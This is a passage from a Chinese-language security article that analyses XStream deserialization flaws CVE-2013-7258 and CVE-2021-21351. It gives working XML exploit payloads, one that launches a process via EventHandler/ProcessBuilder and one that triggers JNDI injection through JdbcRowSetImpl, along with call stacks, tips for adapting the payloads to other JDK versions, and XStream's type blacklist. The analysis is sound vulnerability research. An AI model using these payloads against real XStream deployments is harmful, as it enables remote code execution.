<span class="nl">unmarshal:</span><span class="mi">32</span><span class="o">,</span> <span class="n">AbstractTreeMarshallingStrategy</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1157</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1141</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">1012</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">1003</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">24</span><span class="o">,</span> <span class="n">CVE20137258</span> <span class="o">(</span><span class="n">Xstream</span><span class="o">)</span>
</pre></div>
<p>到这里，整个过程就结束了，<strong>总结如下</strong>：</p>
<ol>
<li>从com.thoughtworks.xstream.core.TreeUnmarshaller的start函数开始，执行HierarchicalStreams.readClassType，通过标签名从Mapper中获取对应的class对象</li>
<li>获得class对象后返回至start函数，来到TreeUnmarshaller的convertAnother函数，该方法将上面返回的类转换成Java对象<ul>
<li>通过mapper.defaultImplementationOf方法查找class的实现类</li>
<li>通过converterLookup.lookupConverterForType根据对应的类寻找正确的转换器Converter</li>
<li>调用AbstractReferenceUnmarshaller的convert方法获得对应的对象</li>
<li>根据获取到的Converter，调用unmarshal方法，读取其子节点，并转化成对应的变量，直到所有节点解析完成</li>
</ul>
</li>
</ol>
<p>另一个POC：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;tree-map&gt;</span>
    <span class="nt">&lt;entry&gt;</span>
        <span class="nt">&lt;dynamic-proxy&gt;</span>
            <span class="nt">&lt;interface&gt;</span>java.lang.Comparable<span class="nt">&lt;/interface&gt;</span>
            <span class="nt">&lt;handler</span> <span class="na">class=</span><span class="s">"java.beans.EventHandler"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;target</span> <span class="na">class=</span><span class="s">"java.lang.ProcessBuilder"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;command&gt;</span>
                        <span class="nt">&lt;string&gt;</span>cmd<span class="nt">&lt;/string&gt;</span>
                        <span class="nt">&lt;string&gt;</span>/C<span class="nt">&lt;/string&gt;</span>
                        <span class="nt">&lt;string&gt;</span>calc<span class="nt">&lt;/string&gt;</span>
                    <span class="nt">&lt;/command&gt;</span>
                <span class="nt">&lt;/target&gt;</span>
                <span class="nt">&lt;action&gt;</span>start<span class="nt">&lt;/action&gt;</span>
            <span class="nt">&lt;/handler&gt;</span>
        <span class="nt">&lt;/dynamic-proxy&gt;</span>
        <span class="nt">&lt;string&gt;</span>good<span class="nt">&lt;/string&gt;</span>
    <span class="nt">&lt;/entry&gt;</span>
<span class="nt">&lt;/tree-map&gt;</span>
</pre></div>
<p>这里通过this.converterLookup.lookupConverterForType函数得到的converter是TreeMapConverter<br/>
而TreeMapConverter的unmarshal函数如下,相对来讲对比于TreeSetConverter转换器的unmarshal函数，少了很多判断条件，即限制</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">unmarshal</span><span class="o">(</span><span class="n">HierarchicalStreamReader</span> <span class="n">reader</span><span class="o">,</span> <span class="n">UnmarshallingContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">TreeMap</span> <span class="n">result</span> <span class="o">=</span> <span class="n">comparatorField</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">()</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
    <span class="c1">// 判断是否存在comparator</span>
    <span class="n">Comparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">unmarshalComparator</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">comparator</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">()</span> <span class="o">:</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">(</span><span class="n">comparator</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="k">this</span><span class="o">.</span><span class="na">populateTreeMap</span><span class="o">(</span><span class="n">reader</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">result</span><span class="o">,</span> <span class="n">comparator</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>其他过程与上面同理</p>
<h2 data-content="1" id="a3fe944b91bd0880f259a13fa963e313">6. CVE-2021-21351</h2>
<p><strong>影响版本</strong>：&lt;=1.4.15<br/>
<strong>测试环境</strong>：XStream1.4.15 jdk1.8_66<br/>
<strong>漏洞复现</strong>：<br/>
POC</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;sorted-set&gt;</span>
  <span class="nt">&lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span>
    <span class="nt">&lt;type&gt;</span>ysomap<span class="nt">&lt;/type&gt;</span>
    <span class="nt">&lt;value</span> <span class="na">class=</span><span class="s">'com.sun.org.apache.xpath.internal.objects.XRTreeFrag'</span><span class="nt">&gt;</span>
      <span class="nt">&lt;m__DTMXRTreeFrag&gt;</span>
        <span class="nt">&lt;m__dtm</span> <span class="na">class=</span><span class="s">'com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'</span><span class="nt">&gt;</span>
          <span class="nt">&lt;m__size&gt;</span>-10086<span class="nt">&lt;/m__size&gt;</span>
          <span class="nt">&lt;m__mgrDefault&gt;</span>
            <span class="nt">&lt;m__incremental&gt;</span>false<span class="nt">&lt;/m__incremental&gt;</span>
            <span class="nt">&lt;m__source__location&gt;</span>false<span class="nt">&lt;/m__source__location&gt;</span>
            <span class="nt">&lt;m__dtms&gt;</span>
              <span class="nt">&lt;null/&gt;</span>
            <span class="nt">&lt;/m__dtms&gt;</span>
            <span class="nt">&lt;m__defaultHandler/&gt;</span>
          <span class="nt">&lt;/m__mgrDefault&gt;</span>
          <span class="nt">&lt;m__shouldStripWS&gt;</span>false<span class="nt">&lt;/m__shouldStripWS&gt;</span>
          <span class="nt">&lt;m__indexing&gt;</span>false<span class="nt">&lt;/m__indexing&gt;</span>
          <span class="nt">&lt;m__incrementalSAXSource</span> <span class="na">class=</span><span class="s">'com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;fPullParserConfig</span> <span class="na">class=</span><span class="s">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="na">serialization=</span><span class="s">'custom'</span><span class="nt">&gt;</span>
              <span class="nt">&lt;javax.sql.rowset.BaseRowSet&gt;</span>
                <span class="nt">&lt;default&gt;</span>
                  <span class="nt">&lt;concurrency&gt;</span>1008<span class="nt">&lt;/concurrency&gt;</span>
                  <span class="nt">&lt;escapeProcessing&gt;</span>true<span class="nt">&lt;/escapeProcessing&gt;</span>
                  <span class="nt">&lt;fetchDir&gt;</span>1000<span class="nt">&lt;/fetchDir&gt;</span>
                  <span class="nt">&lt;fetchSize&gt;</span>0<span class="nt">&lt;/fetchSize&gt;</span>
                  <span class="nt">&lt;isolation&gt;</span>2<span class="nt">&lt;/isolation&gt;</span>
                  <span class="nt">&lt;maxFieldSize&gt;</span>0<span class="nt">&lt;/maxFieldSize&gt;</span>
                  <span class="nt">&lt;maxRows&gt;</span>0<span class="nt">&lt;/maxRows&gt;</span>
                  <span class="nt">&lt;queryTimeout&gt;</span>0<span class="nt">&lt;/queryTimeout&gt;</span>
                  <span class="nt">&lt;readOnly&gt;</span>true<span class="nt">&lt;/readOnly&gt;</span>
                  <span class="nt">&lt;rowSetType&gt;</span>1004<span class="nt">&lt;/rowSetType&gt;</span>
                  <span class="nt">&lt;showDeleted&gt;</span>false<span class="nt">&lt;/showDeleted&gt;</span>
                  <span class="nt">&lt;dataSource&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="nt">&lt;/dataSource&gt;</span>
                  <span class="nt">&lt;listeners/&gt;</span>
                  <span class="nt">&lt;params/&gt;</span>
                <span class="nt">&lt;/default&gt;</span>
              <span class="nt">&lt;/javax.sql.rowset.BaseRowSet&gt;</span>
              <span class="nt">&lt;com.sun.rowset.JdbcRowSetImpl&gt;</span>
                <span class="nt">&lt;default/&gt;</span>
              <span class="nt">&lt;/com.sun.rowset.JdbcRowSetImpl&gt;</span>
            <span class="nt">&lt;/fPullParserConfig&gt;</span>
            <span class="nt">&lt;fConfigSetInput&gt;</span>
              <span class="nt">&lt;class&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="nt">&lt;/class&gt;</span>
              <span class="nt">&lt;name&gt;</span>setAutoCommit<span class="nt">&lt;/name&gt;</span>
              <span class="nt">&lt;parameter-types&gt;</span>
                <span class="nt">&lt;class&gt;</span>boolean<span class="nt">&lt;/class&gt;</span>
              <span class="nt">&lt;/parameter-types&gt;</span>
            <span class="nt">&lt;/fConfigSetInput&gt;</span>
            <span class="nt">&lt;fConfigParse</span> <span class="na">reference=</span><span class="s">'../fConfigSetInput'</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;fParseInProgress&gt;</span>false<span class="nt">&lt;/fParseInProgress&gt;</span>
          <span class="nt">&lt;/m__incrementalSAXSource&gt;</span>
          <span class="nt">&lt;m__walker&gt;</span>
            <span class="nt">&lt;nextIsRaw&gt;</span>false<span class="nt">&lt;/nextIsRaw&gt;</span>
          <span class="nt">&lt;/m__walker&gt;</span>
          <span class="nt">&lt;m__endDocumentOccured&gt;</span>false<span class="nt">&lt;/m__endDocumentOccured&gt;</span>
          <span class="nt">&lt;m__idAttributes/&gt;</span>
          <span class="nt">&lt;m__textPendingStart&gt;</span>-1<span class="nt">&lt;/m__textPendingStart&gt;</span>
          <span class="nt">&lt;m__useSourceLocationProperty&gt;</span>false<span class="nt">&lt;/m__useSourceLocationProperty&gt;</span>
          <span class="nt">&lt;m__pastFirstElement&gt;</span>false<span class="nt">&lt;/m__pastFirstElement&gt;</span>
        <span class="nt">&lt;/m__dtm&gt;</span>
        <span class="nt">&lt;m__dtmIdentity&gt;</span>1<span class="nt">&lt;/m__dtmIdentity&gt;</span>
      <span class="nt">&lt;/m__DTMXRTreeFrag&gt;</span>
      <span class="nt">&lt;m__dtmRoot&gt;</span>1<span class="nt">&lt;/m__dtmRoot&gt;</span>
      <span class="nt">&lt;m__allowRelease&gt;</span>false<span class="nt">&lt;/m__allowRelease&gt;</span>
    <span class="nt">&lt;/value&gt;</span>
  <span class="nt">&lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span>
  <span class="nt">&lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span>
    <span class="nt">&lt;type&gt;</span>ysomap<span class="nt">&lt;/type&gt;</span>
    <span class="nt">&lt;value</span> <span class="na">class=</span><span class="s">'com.sun.org.apache.xpath.internal.objects.XString'</span><span class="nt">&gt;</span>
      <span class="nt">&lt;m__obj</span> <span class="na">class=</span><span class="s">'string'</span><span class="nt">&gt;</span>test<span class="nt">&lt;/m__obj&gt;</span>
    <span class="nt">&lt;/value&gt;</span>
  <span class="nt">&lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span>
<span class="nt">&lt;/sorted-set&gt;</span>
</pre></div>
<p>官方的POC和这个不太一致，使用后会报如下错误</p>
<div class="highlight"><pre><span></span><span class="o">----</span> <span class="n">Debugging</span> <span class="n">information</span> <span class="o">----</span>
<span class="n">message</span>             <span class="o">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">field</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">DTMManagerDefault</span><span class="o">.</span><span class="na">_overrideDefaultParser</span>
<span class="n">field</span>               <span class="o">:</span> <span class="n">_overrideDefaultParser</span>
<span class="kd">class</span>               <span class="err">: </span><span class="nc">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">DTMManagerDefault</span>
<span class="n">required</span><span class="o">-</span><span class="n">type</span>       <span class="o">:</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">DTMManagerDefault</span>
<span class="n">converter</span><span class="o">-</span><span class="n">type</span>      <span class="o">:</span> <span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">reflection</span><span class="o">.</span><span class="na">ReflectionConverter</span>
<span class="n">path</span>                <span class="o">:</span> <span class="o">/</span><span class="n">sorted</span><span class="o">-</span><span class="n">set</span><span class="o">/</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">ldap</span><span class="o">.</span><span class="na">Rdn$RdnEntry</span><span class="o">/</span><span class="n">value</span><span class="o">/</span><span class="n">m_DTMXRTreeFrag</span><span class="o">/</span><span class="n">m_dtm</span><span class="o">/</span><span class="n">m_mgrDefault</span><span class="o">/</span><span class="n">_overrideDefaultParser</span>
</pre></div>
<p>这里表示com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault类中没有_overrideDefaultParser这个字段，于是查阅了JDK1.8_66外部包的这个类，确实没有找到该字段，于是就删除了官方POC中下面这句就得到了以上的POC</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;__overrideDefaultParser&gt;</span>false<span class="nt">&lt;/__overrideDefaultParser&gt;</span>
</pre></div>
<p>这里猜测应该是跟JDK版本有关,经查阅资料，这个属性在JDK低版本中是没有的，相关的博客也提到，可以更换成下面这句</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;__useServicesMechanism&gt;</span>false<span class="nt">&lt;/__useServicesMechanism&gt;</span>
</pre></div>
<p><strong>分析</strong><br/>
函数调用栈</p>
<div class="highlight"><pre><span></span><span class="nl">getObjectFactoryFromReference:</span><span class="mi">142</span><span class="o">,</span> <span class="n">NamingManager</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">spi</span><span class="o">)</span>
<span class="nl">getObjectInstance:</span><span class="mi">319</span><span class="o">,</span> <span class="n">NamingManager</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">spi</span><span class="o">)</span>
<span class="nl">decodeObject:</span><span class="mi">464</span><span class="o">,</span> <span class="n">RegistryContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">registry</span><span class="o">)</span>
<span class="nl">lookup:</span><span class="mi">124</span><span class="o">,</span> <span class="n">RegistryContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">registry</span><span class="o">)</span>
<span class="nl">lookup:</span><span class="mi">205</span><span class="o">,</span> <span class="n">GenericURLContext</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">toolkit</span><span class="o">.</span><span class="na">url</span><span class="o">)</span>
<span class="nl">lookup:</span><span class="mi">417</span><span class="o">,</span> <span class="n">InitialContext</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">)</span>
<span class="nl">connect:</span><span class="mi">624</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">)</span>
<span class="nl">setAutoCommit:</span><span class="mi">4067</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">parseSome:</span><span class="mi">373</span><span class="o">,</span> <span class="n">IncrementalSAXSource_Xerces</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">)</span>
<span class="nl">deliverMoreNodes:</span><span class="mi">312</span><span class="o">,</span> <span class="n">IncrementalSAXSource_Xerces</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">)</span>
<span class="nl">nextNode:</span><span class="mi">814</span><span class="o">,</span> <span class="n">SAX2DTM</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">sax2dtm</span><span class="o">)</span>
<span class="nl">_firstch:</span><span class="mi">535</span><span class="o">,</span> <span class="n">DTMDefaultBase</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">)</span>
<span class="nl">getStringValue:</span><span class="mi">1294</span><span class="o">,</span> <span class="n">SAX2DTM</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">dtm</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">sax2dtm</span><span class="o">)</span>
<span class="nl">str:</span><span class="mi">207</span><span class="o">,</span> <span class="n">XRTreeFrag</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xpath</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">314</span><span class="o">,</span> <span class="n">XObject</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xpath</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">)</span>
<span class="nl">equals:</span><span class="mi">392</span><span class="o">,</span> <span class="n">XString</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xpath</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">)</span>
<span class="nl">compareTo:</span><span class="mi">441</span><span class="o">,</span> <span class="n">Rdn$RdnEntry</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">ldap</span><span class="o">)</span>
<span class="nl">compareTo:</span><span class="mi">420</span><span class="o">,</span> <span class="n">Rdn$RdnEntry</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">naming</span><span class="o">.</span><span class="na">ldap</span><span class="o">)</span>
<span class="nl">put:</span><span class="mi">568</span><span class="o">,</span> <span class="n">TreeMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">putAll:</span><span class="mi">281</span><span class="o">,</span> <span class="n">AbstractMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">putAll:</span><span class="mi">327</span><span class="o">,</span> <span class="n">TreeMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">populateTreeMap:</span><span class="mi">121</span><span class="o">,</span> <span class="n">TreeMapConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">collections</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">92</span><span class="o">,</span> <span class="n">TreeSetConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">collections</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">72</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">72</span><span class="o">,</span> <span class="n">AbstractReferenceUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">66</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">50</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">start:</span><span class="mi">134</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">32</span><span class="o">,</span> <span class="n">AbstractTreeMarshallingStrategy</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1409</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1388</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">1273</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">1264</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">81</span><span class="o">,</span> <span class="n">CVE202121351</span> <span class="o">(</span><span class="n">Xstream</span><span class="o">)</span>
</pre></div>
<p>上面这些xml解析过程直接跳过，可以看到sorted-set里面嵌套的是两个\&lt;javax.naming.ldap.Rdn_-RdnEntry&gt;，在分析CVE-2013-7258上可知，出发点在TreeMap的putAll函数，顺着来到put函数<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212509-fdb6bff2-3aa5-1.png"/><br/>
进入到Rdn$RdnEntry的compareTo函数，将两者的value进行对比<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212533-0bed8664-3aa6-1.png"/><br/>
然后value的值设置的是com.sun.org.apache.xpath.internal.objects.XRTreeFrag，会调用它的equal函数<br/>
接着一直来到XRTreeFrag的str函数：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">String</span> <span class="nf">str</span><span class="o">()</span>
<span class="o">{</span>
    <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">m_DTMXRTreeFrag</span><span class="o">.</span><span class="na">getDTM</span><span class="o">().</span><span class="na">getStringValue</span><span class="o">(</span><span class="n">m_dtmRoot</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>

    <span class="k">return</span> <span class="o">(</span><span class="kc">null</span> <span class="o">==</span> <span class="n">str</span><span class="o">)</span> <span class="o">?</span> <span class="s">""</span> <span class="o">:</span> <span class="n">str</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>通过m_DTMXRTreeFrag.getDTM()函数就可以获得我们设置的m_dtm为SAX2DTM，然后调用其getStringValue函数<br/>
最后经过层层递进来到com/sun/org/apache/xml/internal/dtm/ref/IncrementalSAXSource_Xerces的parseSome函数<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212420-e0635578-3aa5-1.png"/><br/>
在POC中对响应的参数如fPullParserConfig设置成了类JdbcRowSetImpl，接下来就是使用JdbcRowSetImpl这个类去远程加载恶意的类造成JNDI注入了</p>
<h2 data-content="1" id="375d22c1d730217786ab29d43ed13736">7. 防护</h2>
<p>XStream为了防护这些漏洞，直接使用黑名单的方式对可利用链的相关类进行拦截，如1.4.15中XStream.class类中的setupSecurity函数</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">setupSecurity</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">securityMapper</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">addPermission</span><span class="o">(</span><span class="n">AnyTypePermission</span><span class="o">.</span><span class="na">ANY</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">denyTypes</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"java.beans.EventHandler"</span><span class="o">,</span> <span class="s">"java.lang.ProcessBuilder"</span><span class="o">,</span> <span class="s">"javax.imageio.ImageIO$ContainsFilter"</span><span class="o">,</span> <span class="s">"jdk.nashorn.internal.objects.NativeString"</span><span class="o">});</span>
        <span class="k">this</span><span class="o">.</span><span class="na">denyTypesByRegExp</span><span class="o">(</span><span class="k">new</span> <span class="n">Pattern</span><span class="o">[]{</span><span class="n">LAZY_ITERATORS</span><span class="o">,</span> <span class="n">JAVAX_CRYPTO</span><span class="o">,</span> <span class="n">JAXWS_FILE_STREAM</span><span class="o">});</span>
